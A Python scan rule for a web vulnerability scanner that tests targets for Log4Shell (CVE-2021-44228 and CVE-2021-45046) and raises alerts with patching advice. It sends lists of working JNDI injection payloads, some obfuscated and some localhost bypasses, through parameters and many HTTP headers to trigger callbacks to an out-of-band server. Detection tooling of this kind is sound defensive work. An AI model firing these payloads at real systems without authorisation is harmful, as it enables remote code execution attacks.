# Filename: VulnerabilityChecks/Log4ShellScanRule.py

import asyncio
import logging
import random
import re
import time
import uuid # For unique interaction IDs
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Set, TYPE_CHECKING

import aiohttp

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

# Assuming a common Alert structure or adapting one.
# For Log4Shell, we might want specific fields like CVE.
# Let's define a Log4ShellAlert, but it can inherit or be similar to other Alerts.

@dataclass
class Log4ShellAlert: # Based on the generic SQLiAlert structure for now
    cwe_id: int = 532 # CWE-532: Insertion of Sensitive Information into Log File (related, though Log4Shell is RCE)
                      # More accurately, CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement
                      # Or CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
    wasc_id: int = 20 # WASC-20: Improper Input Handling (generic)
    name: str = "Log4Shell Vulnerability"
    description: str = ""
    uri: str = ""
    param: str = ""
    attack: str = ""
    evidence: str = "" # Will be the OAST payload sent
    other_info: str = ""
    solution: str = (
        "Update Log4j to a patched version (2.17.1 or later for CVE-2021-44228/45046 related issues, "
        "check latest advisories for the most current version). "
        "Apply JndiLookup class removal or other mitigations if patching is not immediately possible. "
        "Disable JNDI lookups if not needed: formatMsgNoLookups=true."
    )
    reference: str = (
        "https://logging.apache.org/log4j/2.x/security.html\n"
        "CVE-2021-44228, CVE-2021-45046"
    )
    risk: int = 4  # High
    confidence: int = 2 # Medium (becomes High if OAST interaction is confirmed by an actual OAST server API)
    cve: Optional[str] = None
    oast_payload_sent: Optional[str] = None
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "OWASP_2021_A06": "Vulnerable and Outdated Components", # Or A03:Injection
        "WSTG_V42_INPV_11": "Code Injection", # Closest WSTG category
        "OAST": "Required" # Indicates OAST interaction check is needed
    })

    def as_dict(self) -> Dict[str, Any]: # To match structure from other rules
        return {
            "vulnerability_type": "Log4Shell",
            "type": self.name,
            "detail": self.description,
            "payload_used": self.attack,
            "injection_point": f"param: {self.param}", # Simplified
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": {**self.alert_tags, "CVE": self.cve} if self.cve else self.alert_tags,
            "other_info": self.other_info + f" OAST Payload Sent: {self.oast_payload_sent}" if self.oast_payload_sent else self.other_info
        }


# --- Log4Shell Specific Constants and Payloads ---
CVE_44228 = "CVE-2021-44228"
CVE_45046 = "CVE-2021-45046"

# {0} will be replaced by the OAST server payload (e.g., oast.server.com/uniqueid)
ATTACK_PATTERNS_CVE44228 = [
    "${jndi:ldap://{0}/zaproxy}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/zaproxy}", # Obfuscated rmi
    "${${::-j}ndi:rmi://{0}/zaproxy}", # Obfuscated jndi
    "${jndi:rmi://{0}/zaproxy}",
    "${${lower:jndi}:${lower:rmi}://{0}/zaproxy}",
    "${${lower:${lower:jndi}}:${lower:rmi}://{0}/zaproxy}",
    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}/zaproxy}",
    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{0}/zaproxy}", # Mixed case
    "${jndi:dns://{0}/zaproxy}", # DNS based OAST
    "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/zaproxy}" # Obfuscated ldap
]

ATTACK_PATTERNS_CVE45046 = [ # These target localhost bypasses for CVE-2021-45046
    "${jndi:ldap://127.0.0.1#a.{0}:1389/zaproxy}", # Port specified
    "${jndi:ldap://127.0.0.1#a.{0}/zaproxy}",     # No port, relies on default LDAP port
    "${jndi:ldap://localhost#a.{0}/zaproxy}"      # Using localhost
]


class Log4ShellScanRule:
    tech_required: Set[str] = {
        "Apache APISIX", "Apache HTTP Server", "Apache JSPWiki",
        "Apache Tomcat", "Apache Traffic Server", "Apache Wicket",
        "CRM+", "Carrd", "CouchDB"
    } # Case-insensitive matching should be handled by the calling engine
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None, # e.g., "your-oast-listener.com"
                 http_timeout: float = 10.0,
                 test_cve_44228: bool = True,
                 test_cve_45046: bool = True,
                 max_payloads_per_cve_set: int = 5, # To limit requests if many patterns
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = oast_base_url
        self.http_timeout = http_timeout
        self.test_cve_44228 = test_cve_44228
        self.test_cve_45046 = test_cve_45046
        self.max_payloads_per_cve_set = max_payloads_per_cve_set
        self.active_scan_async_q = active_scan_async_q # Store the queue

        if not self.oast_base_url:
            self.logger.warning("Log4ShellScanRule initialized without an OAST base URL. Scans will be ineffective.")

    def _generate_oast_interaction_payload(self) -> Tuple[str, str]:
        """Generates a unique interaction ID and the full OAST payload URL part."""
        if not self.oast_base_url:
            return "oast_server_not_configured", "oast_server_not_configured"
        
        unique_id = str(uuid.uuid4())
        oast_domain_part = self.oast_base_url.replace("http://", "").replace("https://", "").split('/')[0]
        
        oast_target = f"{unique_id}.{oast_domain_part}"
        return unique_id, oast_target


    async def _send_request_async( # Copied from other SQLi rules, slightly adapted logging
        self,
        session: aiohttp.ClientSession,
        method: str, url: str, headers: Dict[str, str], cookies: Dict[str, str],
        data: Optional[Dict[str, Any]] = None,
        param_name_attacked: Optional[str] = None, payload_used: Optional[str] = None
    ) -> Tuple[Optional[Any], Optional[str], float]:
        start_time = time.monotonic()
        response_text: Optional[str] = None
        current_headers = headers.copy()
        if "User-Agent" not in current_headers:
             current_headers["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])
        log_payload_snippet = str(payload_used)[:70] + "..." if payload_used and len(payload_used) > 70 else payload_used
        self.logger.debug(f"Log4Shell Scan: Sending {method} to {url} (Param: {param_name_attacked}, Payload: {log_payload_snippet})")
        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            if method.upper() == "POST":
                async with session.post(url, headers=current_headers, cookies=cookies, data=data, timeout=timeout, allow_redirects=False) as resp:
                    response_text = await resp.text(errors='replace')
            else:
                async with session.get(url, headers=current_headers, cookies=cookies, timeout=timeout, allow_redirects=False) as resp:
                    response_text = await resp.text(errors='replace')
            duration_ms = (time.monotonic() - start_time) * 1000
            self.logger.debug(f"Log4Shell Scan: Response from {url}: Status {resp.status}, Duration: {duration_ms:.0f}ms")
            @dataclass
            class DetachedResponse: status: int; headers: Dict[str, str]; text_content: Optional[str]
            detached_resp = DetachedResponse(status=resp.status, headers=dict(resp.headers), text_content=response_text)
            resp.release()
            return detached_resp, response_text, duration_ms
        except Exception as e: 
            self.logger.warning(f"Log4Shell Scan: Request for {method} {url} (Payload: {log_payload_snippet}) failed or timed out: {type(e).__name__} - {e}")
            return None, None, (time.monotonic() - start_time) * 1000

    def _build_request_params(self, base_url: str, injection_location: str, param_name: str, payload: str, original_value: str, method: str, original_form_data: Optional[Dict[str, str]] = None) -> Tuple[str, Optional[Dict[str, str]]]:
        target_url = base_url
        request_data: Optional[Dict[str, str]] = None
        if injection_location == "url_query":
            parsed_url = urllib.parse.urlparse(base_url)
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            query_params[param_name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            target_url = parsed_url._replace(query=new_query).geturl()
        elif injection_location == "form_data_post" and method.upper() == "POST":
            request_data = (original_form_data or {}).copy(); request_data[param_name] = payload
            target_url = base_url
        elif injection_location == "form_data_get" and method.upper() == "GET":
            parsed_url = urllib.parse.urlparse(base_url)
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            if original_form_data:
                for k, v_list in urllib.parse.parse_qs(urllib.parse.urlencode(original_form_data, doseq=True)).items(): query_params[k] = v_list
            query_params[param_name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            target_url = parsed_url._replace(query=new_query).geturl()
        return target_url, request_data

    async def _scan_with_payload_set(
        self,
        session: aiohttp.ClientSession,
        base_url: str, original_headers: Dict[str, str], original_cookies: Dict[str, str],
        injection_details: Dict[str, Any],
        attack_patterns: List[str], cve_id: str, alert_name_suffix: str
    ) -> None: # Changed return type to None
        
        if not self.oast_base_url:
            return # Cannot proceed without OAST configuration

        param_name = injection_details["param_name"]
        original_value = injection_details["original_value"]
        location = injection_details["location"]
        method = injection_details.get("method", "GET")
        all_form_fields = injection_details.get("all_form_fields")
        
        patterns_to_try = random.sample(attack_patterns, min(len(attack_patterns), self.max_payloads_per_cve_set))

        for attack_template in patterns_to_try:
            unique_interaction_id, oast_target_host = self._generate_oast_interaction_payload()
            if oast_target_host == "oast_server_not_configured": 
                self.logger.error("OAST server not configured, cannot generate Log4Shell payload.")
                continue

            attack_payload_string = attack_template.replace("{0}", oast_target_host)
            final_injected_value = attack_payload_string

            current_headers = original_headers.copy()
            current_cookies = original_cookies.copy()

            headers_to_test_additionally = [
                "User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP", 
                "X-Remote-IP", "X-Originating-IP", "True-Client-IP", 
                "CF-Connecting-IP", "Forwarded", "Authorization"
            ]
            injection_points_to_try = [(location, param_name)]

            if location != "header":
                for header_to_try in headers_to_test_additionally:
                    if header_to_try not in current_headers:
                         injection_points_to_try.append(("header", header_to_try))
            
            for current_location, current_param_name in injection_points_to_try:
                temp_headers = current_headers.copy()
                temp_cookies = current_cookies.copy()
                target_url_for_scan = base_url # Default to base_url for header/cookie injections

                if current_location == "header":
                    temp_headers[current_param_name] = final_injected_value
                    request_data = None 
                elif current_location == "cookie":
                    temp_cookies[current_param_name] = final_injected_value
                    request_data = None
                else: 
                    target_url_for_scan, request_data = self._build_request_params(
                        injection_details.get("form_action_url", base_url), current_location, 
                        current_param_name, final_injected_value, 
                        injection_details.get("all_form_fields", {}).get(current_param_name, ""),
                        method, all_form_fields
                    )
                
                await self._send_request_async(
                    session, method, target_url_for_scan, temp_headers, temp_cookies, request_data,
                    current_param_name, final_injected_value
                )
                
                description = f"The application may be vulnerable to Log4Shell ({cve_id}) via the '{current_param_name}' parameter ({current_location}). An OAST payload was sent."
                solution = f"Update Log4j to a patched version. Refer to {cve_id} advisories. Verify OAST interaction at {self.oast_base_url} for interaction ID (part of hostname): {unique_interaction_id}"
                reference = f"{cve_id}\nhttps://logging.apache.org/log4j/2.x/security.html"

                alert_instance = Log4ShellAlert(
                    name=f"Log4Shell ({cve_id} - {alert_name_suffix}) via {current_param_name} ({current_location})",
                    description=description,
                    uri=target_url_for_scan, 
                    param=current_param_name, 
                    attack=final_injected_value,
                    evidence=f"OAST Payload Sent. Check OAST server for interaction with target: {oast_target_host} (Unique ID: {unique_interaction_id})",
                    other_info=f"Interaction ID for OAST check: {unique_interaction_id}. OAST Target Host: {oast_target_host}",
                    solution=solution,
                    reference=reference,
                    cve=cve_id,
                    oast_payload_sent=oast_target_host,
                    alert_tags={"CVE": cve_id, "OAST": "Required", "InjectionLocation": current_location}
                )
                
                if self.active_scan_async_q:
                    try:
                        await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
                    except Exception as e_queue:
                        self.logger.error(f"Failed to put Log4Shell alert onto async queue: {e_queue}")
                else:
                    self.logger.warning("active_scan_async_q not available in Log4ShellScanRule, cannot queue alert.")
        return # No longer returns a list


    async def scan(
        self,
        base_url: str, 
        original_headers: Dict[str, str],
        original_cookies: Dict[str, str],
        injection_details: Dict[str, Any], # param_name, original_value, location, method, all_form_fields
        aiohttp_session: aiohttp.ClientSession,
        original_page_content_for_baseline_errors: Optional[str] = None # Not typically used by Log4Shell
    ) -> None: # Changed return type to None
        
        if not self.oast_base_url:
            self.logger.warning("Log4Shell scan skipped: OAST base URL not configured.")
            return
        if not self.active_scan_async_q:
            self.logger.warning("Log4Shell scan skipped: active_scan_async_q not configured.")
            return

        param_name = injection_details["param_name"]
        self.logger.info(f"Starting Log4Shell scan for param: '{param_name}' at location '{injection_details['location']}' on URL: {base_url}")
        
        alerts_generated_count = 0 # Keep track for logging

        if self.test_cve_44228:
            # _scan_with_payload_set now puts alerts on the queue directly
            await self._scan_with_payload_set(
                aiohttp_session, base_url, original_headers, original_cookies,
                injection_details, ATTACK_PATTERNS_CVE44228, CVE_44228, "Generic"
            )
            # Count based on patterns tried, as we don't get a list back
            alerts_generated_count += min(len(ATTACK_PATTERNS_CVE44228), self.max_payloads_per_cve_set) * \
                                      len(self._get_injection_points_to_try(injection_details["location"], original_headers))


        if self.test_cve_45046:
            await self._scan_with_payload_set(
                aiohttp_session, base_url, original_headers, original_cookies,
                injection_details, ATTACK_PATTERNS_CVE45046, CVE_45046, "Localhost Bypass"
            )
            alerts_generated_count += min(len(ATTACK_PATTERNS_CVE45046), self.max_payloads_per_cve_set) * \
                                      len(self._get_injection_points_to_try(injection_details["location"], original_headers))
            
        self.logger.info(f"Log4Shell scan for param: '{param_name}' completed. Attempted to generate up to {alerts_generated_count} potential alerts (OAST verification needed).")
        return # No longer returns a list

    def _get_injection_points_to_try(self, location: str, current_headers: Dict[str, str]) -> list:
        """Helper to determine how many injection points will be tried for alert counting."""
        headers_to_test_additionally = [
            "User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP",
            "X-Remote-IP", "X-Originating-IP", "True-Client-IP",
            "CF-Connecting-IP", "Forwarded", "Authorization"
        ]
        # This is a simplified count based on the logic in _scan_with_payload_set
        # It assumes param_name is always tried for the given location.
        count = 1 
        if location != "header":
            for header_to_try in headers_to_test_additionally:
                if header_to_try not in current_headers:
                    count +=1
        return [None] * count # Return a list of this size for len()